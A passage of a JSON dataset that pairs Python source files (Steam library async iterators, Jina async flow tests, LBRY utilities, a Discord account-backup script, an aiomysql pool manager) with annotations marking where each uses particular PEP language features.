utils.maybe_coroutine(predicate, elem)\n            if ret:\n                return elem\n    async def flatten(self) -> list[T]:\n        return [element async for element in self]\n    def filter(self, predicate: Callable[[T], bool]) -> FilteredIterator[T]:\n        return FilteredIterator(predicate, self)\n    def map(self, func: Callable[[TT], Any]) -> MappedIterator[T, TT]:\n        return MappedIterator(func, self)\n    def __aiter__(self) -> AsyncIterator[T]:\n        return self\n    def __anext__(self) -> Coroutine[None, None, T]:\n        return self.next()\n    async def next(self) -> T:\n        if not self.queue:\n            if self._is_filled:\n                raise StopAsyncIteration\n            await self.fill()\n            self._is_filled = True\n        if not self.queue:  \n            raise StopAsyncIteration\n        return self.queue.pop()\n    async def fill(self) -> None:\n        raise NotImplementedError\nclass FilteredIterator(AsyncIterator[T]):\n    def __init__(self, predicate: MaybeCoro[T], async_iterator: AsyncIterator[T]):\n        self.predicate = predicate\n        self.iterator = async_iterator\n    async def next(self) -> T:\n        while True:\n            item = await self.iterator.next()\n            if await utils.maybe_coroutine(self.predicate, item):\n                return item\nclass MappedIterator(AsyncIterator[TT], Generic[T, TT]):\n    def __init__(self, map_func: Callable[[Any], TT | Coroutine[Any, Any, TT]], async_iterator: AsyncIterator[T]):\n        self.map_func = map_func\n        self.iterator = async_iterator\n    async def next(self) -> TT:\n        item = await self.iterator.next()\n        return await utils.maybe_coroutine(self.map_func, item)\nclass CommentsIterator(AsyncIterator[Comment[CommentableT]]):\n    def __init__(\n        self,\n        state: ConnectionState,\n        limit: int | None,\n        before: datetime | None,\n        after: datetime | None,\n        owner: CommentableT,\n    ):\n        super().__init__(state, limit, before, after)\n        self.owner = owner\n    async def fill(self) -> None:\n        comments = await self._state.fetch_comments(self.owner, self.after, self.limit)\n        author_id64s = set()\n        for comment in comments:\n            comment = Comment(\n                self._state,\n                id=comment.id,\n                content=comment.content,\n                created_at=datetime.utcfromtimestamp(comment.timestamp),\n                author=comment.author_id64,  \n                owner=self.owner,\n            )\n            if comment.created_at < self.before:\n                continue  \n            if not self._append(comment):\n                break\n            author_id64s.add(comment.author)\n        await self._fill_queue_users(author_id64s)\nclass TradesIterator(AsyncIterator[\"TradeOffer\"]):\n    def __init__(\n        self,\n        state: ConnectionState,\n        limit: int | None,\n        before: datetime | None,\n        after: datetime | None,\n        active_only: bool,\n    ):\n        super().__init__(state, limit, before, after)\n        self._active_only = active_only\n    async def fill(self) -> None:\n        from .trade import TradeOffer\n        resp = await self._state.http.get_trade_history(100, None)\n        resp = resp[\"response\"]\n        total = resp.get(\"total_trades\", 0)\n        if not total:\n            return\n        descriptions = resp.get(\"descriptions\", [])\n        after_timestamp = self.after.timestamp()\n        before_timestamp = self.before.timestamp()\n        class Stop(Exception):\n            ...\n        async def process_trade(data: dict[str, Any], descriptions: list[DescriptionDict]) -> None:\n            if not after_timestamp < data[\"time_init\"] < before_timestamp:\n                return\n            for item in descriptions:\n                for asset in data.get(\"assets_received\", []):\n                    if item[\"classid\"] == asset[\"classid\"] and item[\"instanceid\"] == asset[\"instanceid\"]:\n                        asset.update(item)\n                for asset in data.get(\"assets_given\", []):\n                    if item[\"classid\"] == asset[\"classid\"] and item[\"instanceid\"] == asset[\"instanceid\"]:\n                        asset.update(item)\n            data[\"tradeofferid\"] = data[\"tradeid\"]\n            data[\"accountid_other\"] = data[\"steamid_other\"]\n            data[\"trade_offer_state\"] = data[\"status\"]\n            data[\"items_to_give\"] = data.get(\"assets_given\", [])\n            data[\"items_to_receive\"] = data.get(\"assets_received\", [])\n            trade = TradeOffer._from_api(state=self._state, data=data)\n            if not self._active_only and trade.state in (TradeOfferState.Active, TradeOfferState.ConfirmationNeed):\n                if not self._append(trade):\n                    raise Stop\n                partner_id64s.add(trade.partner)\n        partner_id64s = set()\n        try:\n            for trade in resp.get(\"trades\", []):\n                await process_trade(trade, descriptions)\n            previous_time = trade[\"time_init\"]\n            if total < 100:\n                for page in range(200, math.ceil((total + 100) / 100) * 100, 100):\n                    resp = await self._state.http.get_trade_history(page, previous_time)\n                    resp = resp[\"response\"]\n                    for trade in resp.get(\"trades\", []):\n                        previous_time = trade[\"time_init\"]\n                        await process_trade(trade, descriptions)\n        except Stop:\n            pass\n        await self._fill_queue_users(partner_id64s, (\"partner\",))\nclass ChannelHistoryIterator(AsyncIterator[M], Generic[M, ChannelT]):\n    def __init__(\n        self,\n        channel: ChannelT,\n        state: ConnectionState,\n        limit: int | None,\n        before: datetime | None,\n        after: datetime | None,\n    ):\n        super().__init__(state, limit, before, after)\n        self.before = before or UNIX_EPOCH\n        self.channel = channel\nclass DMChannelHistoryIterator(ChannelHistoryIterator[\"UserMessage\", \"DMChannel\"]):\n    __slots__ = (\"participant\",)\n    def __init__(\n        self,\n        channel: DMChannel,\n        state: ConnectionState,\n        limit: int | None,\n        before: datetime | None,\n        after: datetime | None,\n    ):\n        super().__init__(channel, state, limit, before, after)\n        self.participant = channel.participant\n    async def fill(self) -> None:\n        from .message import Message, UserMessage\n        after_timestamp = int(self.after.timestamp())\n        before_timestamp = int(self.before.timestamp())\n        last_message_timestamp = before_timestamp\n        while True:\n            resp = await self._state.fetch_user_history(\n                self.participant.id64, start=after_timestamp, last=last_message_timestamp\n            )\n            if not resp.messages:\n                return\n            for message in resp.messages:\n                new_message = UserMessage.__new__(UserMessage)\n                Message.__init__(new_message, channel=self.channel, proto=message)\n                new_message.author = (  \n                    self.participant if message.accountid == self.participant.id else self._state.client.user\n                )\n                new_message.created_at = datetime.utcfromtimestamp(message.timestamp)\n                if not self._append(new_message):\n                    return\n            last_message_timestamp = int(message.timestamp)\n            if not resp.more_available:\n                return\nGroupMessages = TypeVar(\"GroupMessages\", bound=\"ClanMessage | GroupMessage\")\nGroupChannels = TypeVar(\"GroupChannels\", bound=\"ClanChannel | GroupChannel\")\nclass GroupChannelHistoryIterator(ChannelHistoryIterator[GroupMessages, GroupChannels]):\n    __slots__ = (\"group\",)\n    def __init__(\n        self,\n        channel: ClanChannel | GroupChannel,\n        state: ConnectionState,\n        limit: int | None,\n        before: datetime | None,\n        after: datetime | None,\n    ):\n        super().__init__(channel, state, limit, before, after)\n        self.group = channel.group or channel.clan\n    async def fill(self) -> None:\n        from .message import ClanMessage, GroupMessage, Message\n        after_timestamp = int(self.after.timestamp())\n        before_timestamp = int(self.before.timestamp())\n        last_message_timestamp = before_timestamp\n        group_id = getattr(self.group, \"chat_id\", None) or self.group.id\n        author_id64s = set()\n        while True:\n            resp = await self._state.fetch_group_history(\n                group_id, self.channel.id, start=after_timestamp, last=last_message_timestamp\n            )\n            if not resp.messages:\n                return\n            for message in resp.messages:\n                new_message = (\n                    GroupMessage.__new__(GroupMessage) if self.channel.group else ClanMessage.__new__(ClanMessage)\n                )\n                Message.__init__(new_message, channel=self.channel, proto=message)\n                new_message.author = utils.make_id64(message.sender)  \n                author_id64s.add(new_message.author)\n                new_message.created_at = datetime.utcfromtimestamp(message.server_timestamp)\n                if not self._append(new_message):\n                    break\n            last_message_timestamp = int(message.server_timestamp)\n            if not resp.more_available:\n                break\n        await self._fill_queue_users(author_id64s)\nclass _EventIterator(AsyncIterator[T]):\n    ID_PARSE_REGEX: ClassVar[re.Pattern[str]]\n    def __init__(\n        self, clan: Clan, state: ConnectionState, limit: int | None, before: datetime | None, after: datetime | None\n    ):\n        super().__init__(state, limit, before, after)\n        self.clan = clan\n    async def fill(self) -> None:\n        cls = self.__class__\n        rss = await self._state.http.get_clan_rss(\n            self.clan.id64\n        )  \n        soup = BeautifulSoup(rss, \"html.parser\")\n        ids = []\n        for url in soup.find_all(\"guid\"):\n            match = cls.ID_PARSE_REGEX.findall(url.text)\n            if match:\n                ids.append(int(match[0]))\n        if not ids:\n            return\n        events = await self.get_events(ids)\n        to_fetch_id64s = set()\n        from . import event\n        event_cls: type[Announcement | Event] = getattr(\n            event, cls.__orig_bases__[0].__args__[0].__forward_arg__  \n        )\n        for event_ in events[\"events\"]:\n            event = event_cls(self._state, self.clan, event_)\n            to_fetch_id64s.add(event.author)\n            to_fetch_id64s.add(event.last_edited_by)\n            if not self._append(event):\n                break\n        await self._fill_queue_users(to_fetch_id64s, (\"author\", \"last_edited_by\", \"approved_by\"))\n    async def get_events(self, ids: list[int]) -> dict[str, Any]:\n        raise NotImplementedError\nclass EventIterator(_EventIterator[\"Event\"]):\n    ID_PARSE_REGEX = re.compile(r\"events/+(\\d+)\")\n    async def get_events(self, ids: list[int]) -> dict[str, Any]:\n        return await self._state.http.get_clan_events(self.clan.id, ids)\nclass AnnouncementsIterator(_EventIterator[\"Announcement\"]):\n    ID_PARSE_REGEX = re.compile(r\"announcements/detail/(\\d+)\")\n    async def get_events(self, ids: list[int]) -> dict[str, Any]:\n        announcements = await asyncio.gather(\n            *(\n                self._state.http.get_clan_announcement(\n                    self.clan.id,\n                    id,\n                    self.clan.game.id if self.clan.is_game_clan else None,  \n                )\n                for id in ids\n            )\n        )\n        events = []\n        for announcement in announcements:\n            events += announcement[\"events\"]\n        return {\"events\": events}",
            "patterns": {
                "pep_526": [
                    [
                        28,
                        "MaybeCoro: TypeAlias = \"Callable[[T], bool | Coroutine[Any, Any, bool]]\""
                    ],
                    [
                        286,
                        "ID_PARSE_REGEX: ClassVar[re.Pattern[str]]"
                    ],
                    [
                        36,
                        "self.queue: deque[T] = deque()"
                    ],
                    [
                        308,
                        "event_cls: type[Announcement | Event] = getattr("
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        1,
                        "from __future__ import annotations",
                        "import"
                    ]
                ],
                "pep_585": [
                    [
                        50,
                        "        id64s: set[Any],  ",
                        "error"
                    ],
                    [
                        51,
                        "        attributes: tuple[str, ...] = (\"author\",),",
                        "error"
                    ],
                    [
                        73,
                        "    async def flatten(self) -> list[T]:",
                        "error"
                    ],
                    [
                        318,
                        "    async def get_events(self, ids: list[int]) -> dict[str, Any]:",
                        "error"
                    ],
                    [
                        318,
                        "    async def get_events(self, ids: list[int]) -> dict[str, Any]:",
                        "error"
                    ],
                    [
                        322,
                        "    async def get_events(self, ids: list[int]) -> dict[str, Any]:",
                        "error"
                    ],
                    [
                        322,
                        "    async def get_events(self, ids: list[int]) -> dict[str, Any]:",
                        "error"
                    ],
                    [
                        326,
                        "    async def get_events(self, ids: list[int]) -> dict[str, Any]:",
                        "error"
                    ],
                    [
                        326,
                        "    async def get_events(self, ids: list[int]) -> dict[str, Any]:",
                        "error"
                    ],
                    [
                        162,
                        "        async def process_trade(data: dict[str, Any], descriptions: list[DescriptionDict]) -> None:",
                        "error"
                    ],
                    [
                        162,
                        "        async def process_trade(data: dict[str, Any], descriptions: list[DescriptionDict]) -> None:",
                        "error"
                    ]
                ],
                "pep_530": [
                    [
                        74,
                        "return [element async for element in self]"
                    ]
                ],
                "pep_525": [
                    [
                        69,
                        72,
                        "async for",
                        "async for elem in self:\n            ret = await utils.maybe_coroutine(predicate, elem)\n            if ret:\n                return elem"
                    ]
                ]
            }
        },
        "120": {
            "file": "import asyncio\nimport time\nimport numpy as np\nimport pytest\nfrom jina import Document, Flow\nfrom jina.flow.asyncio import AsyncFlow\nfrom jina.logging.profile import TimeContext\nfrom jina.types.document.generators import from_ndarray\nfrom jina.types.request import Response\nfrom tests import validate_callback\nnum_docs = 5\ndef validate(req):\n    assert len(req.docs) == num_docs\n    assert req.docs[0].blob.ndim == 1\ndef documents(start_index, end_index):\n    for i in range(start_index, end_index):\n        with Document() as doc:\n            doc.text = 'this is text'\n            doc.tags['id'] = 'id in tags'\n            doc.tags['inner_dict'] = {'id': 'id in inner_dict'}\n            with Document() as chunk:\n                chunk.text = 'text in chunk'\n                chunk.tags['id'] = 'id in chunk tags'\n            doc.chunks.append(chunk)\n        yield doc\n@pytest.mark.asyncio\n@pytest.mark.parametrize('restful', [False])\n@pytest.mark.parametrize('flow_cls', [Flow, AsyncFlow])\nasync def test_run_async_flow(restful, mocker, flow_cls):\n    r_val = mocker.Mock()\n    with flow_cls(restful=restful, asyncio=True).add() as f:\n        async for r in f.index(\n            from_ndarray(np.random.random([num_docs, 4])), on_done=r_val\n        ):\n            assert isinstance(r, Response)\n    validate_callback(r_val, validate)\nasync def async_input_function():\n    for _ in range(num_docs):\n        yield Document(content=np.random.random([4]))\n        await asyncio.sleep(0.1)\nasync def async_input_function2():\n    for _ in range(num_docs):\n        yield Document(content=np.random.random([4]))\n        await asyncio.sleep(0.1)\n@pytest.mark.asyncio\n@pytest.mark.parametrize('restful', [False])\n@pytest.mark.parametrize(\n    'inputs',\n    [\n        async_input_function,\n        async_input_function(),\n        async_input_function2(),\n        async_input_function2,\n    ],\n)\nasync def test_run_async_flow_async_input(restful, inputs, mocker):\n    r_val = mocker.Mock()\n    with AsyncFlow(asyncio=True).add() as f:\n        async for r in f.index(inputs, on_done=r_val):\n            assert isinstance(r, Response)\n    validate_callback(r_val, validate)\nasync def run_async_flow_5s(restful):\n    from jina import Executor, requests\n    class Wait5s(Executor):\n        @requests\n        def foo(self, **kwargs):\n            print('im called!')\n            time.sleep(5)\n    with Flow(restful=restful, asyncio=True).add(uses=Wait5s) as f:\n        async for r in f.index(\n            from_ndarray(np.random.random([num_docs, 4])),\n            on_done=validate,\n        ):\n            assert isinstance(r, Response)\nasync def sleep_print():\n    print('heavylifting other io-bound jobs, e.g. download, upload, file io')\n    await asyncio.sleep(5)\n    print('heavylifting done after 5s')\nasync def concurrent_main(restful):\n    await asyncio.gather(run_async_flow_5s(restful), sleep_print())\nasync def sequential_main(restful):\n    await run_async_flow_5s(restful)\n    await sleep_print()\n@pytest.mark.asyncio\n@pytest.mark.parametrize('restful', [False])\nasync def test_run_async_flow_other_task_sequential(restful):\n    with TimeContext('sequential await') as t:\n        await sequential_main(restful)\n    assert t.duration >= 10\n@pytest.mark.asyncio\n@pytest.mark.parametrize('restful', [False])\nasync def test_run_async_flow_other_task_concurrent(restful):\n    with TimeContext('concurrent await') as t:\n        await concurrent_main(restful)\n    assert t.duration < 10\n@pytest.mark.asyncio\n@pytest.mark.parametrize('return_results', [False])\n@pytest.mark.parametrize('restful', [False])\n@pytest.mark.parametrize('flow_cls', [Flow, AsyncFlow])\nasync def test_return_results_async_flow(return_results, restful, flow_cls):\n    with flow_cls(\n        restful=restful, asyncio=True, return_results=return_results\n    ).add() as f:\n        async for r in f.index(from_ndarray(np.random.random([10, 2]))):\n            assert isinstance(r, Response)\n@pytest.mark.asyncio\n@pytest.mark.parametrize('return_results', [False, True])\n@pytest.mark.parametrize('restful', [False])\n@pytest.mark.parametrize('flow_api', ['delete', 'index', 'update', 'search'])\n@pytest.mark.parametrize('flow_cls', [Flow, AsyncFlow])\nasync def test_return_results_async_flow_crud(\n    return_results, restful, flow_api, flow_cls\n):\n    with flow_cls(\n        restful=restful, asyncio=True, return_results=return_results\n    ).add() as f:\n        async for r in getattr(f, flow_api)(documents(0, 10)):\n            assert isinstance(r, Response)\n@pytest.mark.asyncio\n@pytest.mark.parametrize('flow_cls', [Flow, AsyncFlow])\nasync def test_async_flow_empty_data(flow_cls):\n    from jina import Executor, requests\n    class MyExec(Executor):\n        @requests\n        def foo(self, parameters, **kwargs):\n            assert parameters['hello'] == 'world'\n    with flow_cls(asyncio=True).add(uses=MyExec) as f:\n        async for r in f.post('/hello', parameters={'hello': 'world'}):\n            assert isinstance(r, Response)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        37,
                        40,
                        "async generator",
                        "async def async_input_function():\n    for _ in range(num_docs):\n        yield Document(content=np.random.random([4]))\n        await asyncio.sleep(0.1)"
                    ],
                    [
                        41,
                        44,
                        "async generator",
                        "async def async_input_function2():\n    for _ in range(num_docs):\n        yield Document(content=np.random.random([4]))\n        await asyncio.sleep(0.1)"
                    ],
                    [
                        32,
                        35,
                        "async for",
                        "async for r in f.index(\n            from_ndarray(np.random.random([num_docs, 4])), on_done=r_val\n        ):\n            assert isinstance(r, Response)"
                    ],
                    [
                        59,
                        60,
                        "async for",
                        "async for r in f.index(inputs, on_done=r_val):\n            assert isinstance(r, Response)"
                    ],
                    [
                        70,
                        74,
                        "async for",
                        "async for r in f.index(\n            from_ndarray(np.random.random([num_docs, 4])),\n            on_done=validate,\n        ):\n            assert isinstance(r, Response)"
                    ],
                    [
                        104,
                        105,
                        "async for",
                        "async for r in f.index(from_ndarray(np.random.random([10, 2]))):\n            assert isinstance(r, Response)"
                    ],
                    [
                        117,
                        118,
                        "async for",
                        "async for r in getattr(f, flow_api)(documents(0, 10)):\n            assert isinstance(r, Response)"
                    ],
                    [
                        128,
                        129,
                        "async for",
                        "async for r in f.post('/hello', parameters={'hello': 'world'}):\n            assert isinstance(r, Response)"
                    ]
                ]
            }
        },
        "121": {
            "file": "import base64\nimport codecs\nimport datetime\nimport random\nimport socket\nimport string\nimport json\nimport typing\nimport asyncio\nimport ssl\nimport logging\nimport ipaddress\nimport pkg_resources\nimport contextlib\nimport certifi\nimport aiohttp\nimport functools\nimport collections\nfrom lbrynet.schema.claim import Claim\nfrom lbrynet.cryptoutils import get_lbry_hash_obj\nlog = logging.getLogger(__name__)\ndef now():\n    return datetime.datetime.now()\ndef utcnow():\n    return datetime.datetime.utcnow()\ndef isonow():\n    return utcnow().isoformat() + 'Z'\ndef today():\n    return datetime.datetime.today()\ndef timedelta(**kwargs):\n    return datetime.timedelta(**kwargs)\ndef datetime_obj(*args, **kwargs):\n    return datetime.datetime(*args, **kwargs)\ndef generate_id(num=None):\n    h = get_lbry_hash_obj()\n    if num is not None:\n        h.update(str(num).encode())\n    else:\n        h.update(str(random.getrandbits(512)).encode())\n    return h.digest()\ndef version_is_greater_than(a, b):\n    return pkg_resources.parse_version(a) > pkg_resources.parse_version(b)\ndef rot13(some_str):\n    return codecs.encode(some_str, 'rot_13')\ndef deobfuscate(obfustacated):\n    return base64.b64decode(rot13(obfustacated)).decode()\ndef obfuscate(plain):\n    return rot13(base64.b64encode(plain).decode())\ndef check_connection(server=\"lbry.io\", port=80, timeout=5) -> bool:\n    log.debug('Checking connection to %s:%s', server, port)\n    try:\n        server = socket.gethostbyname(server)\n        socket.create_connection((server, port), timeout).close()\n        log.debug('Connection successful')\n        return True\n    except (socket.gaierror, socket.herror) as ex:\n        log.warning(\"Failed to connect to %s:%s. Unable to resolve domain. Trying to bypass DNS\",\n                    server, port)\n        try:\n            server = \"8.8.8.8\"\n            port = 53\n            socket.create_connection((server, port), timeout).close()\n            log.debug('Connection successful')\n            return True\n        except Exception:\n            log.error(\"Failed to connect to %s:%s. Maybe the internet connection is not working\",\n                      server, port)\n            return False\n    except Exception:\n        log.error(\"Failed to connect to %s:%s. Maybe the internet connection is not working\",\n                  server, port)\n        return False\nasync def async_check_connection(server=\"lbry.io\", port=80, timeout=5) -> bool:\n    return await asyncio.get_event_loop().run_in_executor(None, check_connection, server, port, timeout)\ndef random_string(length=10, chars=string.ascii_lowercase):\n    return ''.join([random.choice(chars) for _ in range(length)])\ndef short_hash(hash_str):\n    return hash_str[:6]\ndef get_sd_hash(stream_info):\n    if not stream_info:\n        return None\n    if isinstance(stream_info, Claim):\n        return stream_info.stream.source.sd_hash\n    result = stream_info.get('claim', {}).\\\n        get('value', {}).\\\n        get('stream', {}).\\\n        get('source', {}).\\\n        get('source')\n    if not result:\n        log.warning(\"Unable to get sd_hash\")\n    return result\ndef json_dumps_pretty(obj, **kwargs):\n    return json.dumps(obj, sort_keys=True, indent=2, separators=(',', ': '), **kwargs)\ndef cancel_task(task: typing.Optional[asyncio.Task]):\n    if task and not task.done():\n        task.cancel()\ndef cancel_tasks(tasks: typing.List[typing.Optional[asyncio.Task]]):\n    for task in tasks:\n        cancel_task(task)\ndef drain_tasks(tasks: typing.List[typing.Optional[asyncio.Task]]):\n    while tasks:\n        cancel_task(tasks.pop())\ndef async_timed_cache(duration: int):\n    def wrapper(fn):\n        cache: typing.Dict[typing.Tuple,\n                           typing.Tuple[typing.Any, float]] = {}\n        @functools.wraps(fn)\n        async def _inner(*args, **kwargs) -> typing.Any:\n            loop = asyncio.get_running_loop()\n            now = loop.time()\n            key = tuple([args, tuple([tuple([k, kwargs[k]]) for k in kwargs])])\n            if key in cache and (now - cache[key][1] < duration):\n                return cache[key][0]\n            to_cache = await fn(*args, **kwargs)\n            cache[key] = to_cache, now\n            return to_cache\n        return _inner\n    return wrapper\ndef cache_concurrent(async_fn):\n    cache: typing.Dict = {}\n    @functools.wraps(async_fn)\n    async def wrapper(*args, **kwargs):\n        key = tuple([args, tuple([tuple([k, kwargs[k]]) for k in kwargs])])\n        cache[key] = cache.get(key) or asyncio.create_task(async_fn(*args, **kwargs))\n        try:\n            return await cache[key]\n        finally:\n            cache.pop(key, None)\n    return wrapper\n@async_timed_cache(300)\nasync def resolve_host(url: str, port: int, proto: str) -> str:\n    if proto not in ['udp', 'tcp']:\n        raise Exception(\"invalid protocol\")\n    try:\n        if ipaddress.ip_address(url):\n            return url\n    except ValueError:\n        pass\n    loop = asyncio.get_running_loop()\n    return (await loop.getaddrinfo(\n        url, port,\n        proto=socket.IPPROTO_TCP if proto == 'tcp' else socket.IPPROTO_UDP,\n        type=socket.SOCK_STREAM if proto == 'tcp' else socket.SOCK_DGRAM\n    ))[0][4][0]\nclass LRUCache:\n    __slots__ = [\n        'capacity',\n        'cache'\n    ]\n    def __init__(self, capacity):\n        self.capacity = capacity\n        self.cache = collections.OrderedDict()\n    def get(self, key):\n        value = self.cache.pop(key)\n        self.cache[key] = value\n        return value\n    def set(self, key, value):\n        try:\n            self.cache.pop(key)\n        except KeyError:\n            if len(self.cache) >= self.capacity:\n                self.cache.popitem(last=False)\n        self.cache[key] = value\n    def __contains__(self, item) -> bool:\n        return item in self.cache\ndef lru_cache_concurrent(cache_size: typing.Optional[int] = None,\n                         override_lru_cache: typing.Optional[LRUCache] = None):\n    if not cache_size and override_lru_cache is None:\n        raise ValueError(\"invalid cache size\")\n    concurrent_cache = {}\n    lru_cache = override_lru_cache or LRUCache(cache_size)\n    def wrapper(async_fn):\n        @functools.wraps(async_fn)\n        async def _inner(*args, **kwargs):\n            key = tuple([args, tuple([tuple([k, kwargs[k]]) for k in kwargs])])\n            if key in lru_cache:\n                return lru_cache.get(key)\n            concurrent_cache[key] = concurrent_cache.get(key) or asyncio.create_task(async_fn(*args, **kwargs))\n            try:\n                result = await concurrent_cache[key]\n                lru_cache.set(key, result)\n                return result\n            finally:\n                concurrent_cache.pop(key, None)\n        return _inner\n    return wrapper\ndef get_ssl_context() -> ssl.SSLContext:\n    return ssl.create_default_context(\n        purpose=ssl.Purpose.CLIENT_AUTH, capath=certifi.where()\n    )\n@contextlib.asynccontextmanager\nasync def aiohttp_request(method, url, **kwargs) -> typing.AsyncContextManager[aiohttp.ClientResponse]:\n    async with aiohttp.ClientSession() as session:\n        async with session.request(method, url, ssl=get_ssl_context(), **kwargs) as response:\n            yield response\nasync def get_external_ip() -> typing.Optional[str]:  \n    try:\n        async with aiohttp_request(\"get\", \"https://api.lbry.io/ip\") as resp:\n            response = await resp.json()\n            if response['success']:\n                return response['data']['ip']\n    except Exception as e:\n        return",
            "patterns": {
                "pep_468": [
                    [
                        31,
                        "datetime.timedelta(**kwargs)"
                    ],
                    [
                        33,
                        "datetime.datetime(*args, **kwargs)"
                    ],
                    [
                        93,
                        "json.dumps(obj, sort_keys=True, indent=2, separators=(',', ': '), **kwargs)"
                    ],
                    [
                        114,
                        "fn(*args, **kwargs)"
                    ],
                    [
                        124,
                        "async_fn(*args, **kwargs)"
                    ],
                    [
                        178,
                        "async_fn(*args, **kwargs)"
                    ],
                    [
                        194,
                        "session.request(method, url, ssl=get_ssl_context(), **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        120,
                        "cache: typing.Dict = {}"
                    ],
                    [
                        105,
                        "cache: typing.Dict[typing.Tuple,"
                    ]
                ],
                "pep_567": [
                    [
                        9,
                        9,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        192,
                        195,
                        "async generator",
                        "async def aiohttp_request(method, url, **kwargs) -> typing.AsyncContextManager[aiohttp.ClientResponse]:\n    async with aiohttp.ClientSession() as session:\n        async with session.request(method, url, ssl=get_ssl_context(), **kwargs) as response:\n            yield response"
                    ]
                ]
            }
        },
        "122": {
            "file": "import asyncio\nimport discord, json, os\nfrom config import *\nfrom util import *\nfrom classes.User import User, Me\nfrom classes.Guild import Guild\nfile = os.path.basename(__file__)\npath = os.path.dirname(os.path.realpath(__file__))\nlog(file, \"START\")\nclass MyClient(discord.Client):\n    backupPath = \"\"\n    async def on_ready(self):\n        log('Logged on as', self.user)\n        self.backupPath = os.path.join(path, str(self.user.id))\n        await self.backupAccountDetails()\n        self.backupUsers(\"friends\", self.user.friends)\n        self.backupUsers(\"blocked\", self.user.blocked)\n        log(\"Backups finished!\")\n        await self.logout()\n    async def backupAllEmojis(self):\n        for guild in self.guilds:\n            await self.backupEmojis(guild)\n    async def backupEmojis(self, guild = None):\n        if guild is int: guild = self.get_guild(guild)\n        emojipath = os.path.join(self.backupPath, \"guilds\", str(guild.id), \"emojis\")\n        log(\"Backing up\", len(guild.emojis), \"emojis from guild\", guild.name, \"(\", guild.id, \") into\", emojipath)\n        createDirFor(emojipath, isDir=True)\n        for emoji in guild.emojis:\n            extension = str(emoji.url).split(\".\")[-1]\n            filename = f\"{emoji.name}.{extension}\"\n            path = os.path.join(emojipath, filename)\n            log(\"Saving Emoji\", emoji.name, \"from\", emoji.url, \"to\", path)\n            await emoji.url.save(path)\n        teststr = \"\"\n        for emoji in guild.emojis:\n            teststr += f\":{emoji.name}:\"\n        print(teststr)\n    def backupUsers(self, name, users):\n        log(\"Backing up\", name)\n        _users = list()\n        for friend in users:\n            user = User(friend)\n            _users.append(user)\n        savePath = os.path.join(self.backupPath, f\"{name}.json\")\n        saveJSON(savePath, _users, encoder=MyEncoder)\n        log(\"Backed up\", len(_users), name, \"to\", savePath)\n    async def backupAccountDetails(self):\n        log(\"Backing up account details\")\n        savePath = os.path.join(self.backupPath, \"account.json\")\n        me = Me(self.user)\n        await me.setAvatar(self.user)\n        saveJSON(savePath, me, encoder=MyEncoder)\n    async def aio_guilds(self):\n        guilds = self.guilds\n        for guild in guilds:\n            yield guild\n    async def backupGuilds(self):\n        log(\"Backing up\", len(self.guilds), \"guilds\")\n        guilds = list()\n        async for guild in self.aio_guilds():\n            log(\"Guild\", guild.name, guild.id)\n            if not guild or not guild.me: continue\n            _guild = Guild(guild)\n            await _guild.getInvite(guild) \n            await asyncio.sleep(sleep_between_invites) \n            guilds.append(_guild)\n        savePath = os.path.join(self.backupPath, \"guilds.json\")\n        saveJSON(savePath, guilds, encoder=MyEncoder)\n        log(\"Backed up\", len(guilds), \"guilds to\", savePath)\nclient = MyClient()\nlog(\"Logging in with\", discord_token.split(\".\")[0]+\"...\")\nclient.run(discord_token, bot=False)\nlog(file, \"END\")",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        53,
                        56,
                        "async generator",
                        "async def aio_guilds(self):\n        guilds = self.guilds\n        for guild in guilds:\n            yield guild"
                    ],
                    [
                        60,
                        66,
                        "async for",
                        "async for guild in self.aio_guilds():\n            log(\"Guild\", guild.name, guild.id)\n            if not guild or not guild.me: continue\n            _guild = Guild(guild)\n            await _guild.getInvite(guild) \n            await asyncio.sleep(sleep_between_invites) \n            guilds.append(_guild)"
                    ]
                ],
                "pep_498": [
                    [
                        30,
                        "            filename = f\"{emoji.name}.{extension}\""
                    ],
                    [
                        36,
                        "            teststr += f\":{emoji.name}:\""
                    ],
                    [
                        44,
                        "        savePath = os.path.join(self.backupPath, f\"{name}.json\")"
                    ]
                ]
            }
        },
        "123": {
            "file": "from typing import Union, Tuple\nfrom contextlib import asynccontextmanager\nfrom aiomysql import create_pool\nclass AioMysqlManager(object):\n    _clients = {}\n    @staticmethod\n    def parse_params(alias_or_params: Union[str, dict]) -> Tuple[str, Union[dict, None]]:\n        if isinstance(alias_or_params, str):\n            return alias_or_params, None\n        mysql_params = alias_or_params.copy()\n        alias = mysql_params.pop('alias', f\"{mysql_params['host']}{mysql_params['port']}\")\n        return alias, mysql_params\n    async def create(self, params: Union[dict], alias=None):\n        if alias is None:\n            alias, params = self.parse_params(params)\n        mysql_pool = await create_pool(**params)\n        return self._clients.setdefault(alias, mysql_pool)\n    @asynccontextmanager\n    async def get(self, alias_or_params: Union[str, dict], ping=False):\n        assert isinstance(alias_or_params, (str, dict)), \"alias_or_params \u53c2\u6570\u4e0d\u6b63\u786e\"\n        alias, params = self.parse_params(alias_or_params)\n        mysql_pool = self._clients.get(alias)\n        if not mysql_pool:\n            mysql_pool = await self.create(params, alias)\n        conn = await mysql_pool.acquire()\n        if ping:\n            await conn.ping()\n        cur = await conn.cursor()\n        yield conn, cur\n        await cur.close()\n        await mysql_pool.release(conn)\n    async def close(self, alias_or_params: Union[str, dict]):\n        assert isinstance(alias_or_params, (str, dict)), \"alias_or_params \u53c2\u6570\u4e0d\u6b63\u786e\"\n        alias, _ = self.parse_params(alias_or_params)\n        mysql_pool = self._clients.get(alias)\n        if mysql_pool:\n            mysql_pool.close()\n            await mysql_pool.wait_closed()\n    async def close_all(self):\n        for alias in list(self._clients.keys()):\n            await self.close(alias)\nmysql_manager = AioMysqlManager()\nif __name__ == '__main__':\n    import asyncio\n    async def test():\n        mysql_pool = await mysql_manager.create({\n            'alias': 'xx',\n            'db': 'test',\n            'user': 'root',\n            'password': 'root',\n            'host': '192.168.5.237',\n            'port': 3306,\n            'charset': 'utf8',\n        })\n        try:\n            conn = await mysql_pool.acquire()\n            cur = await 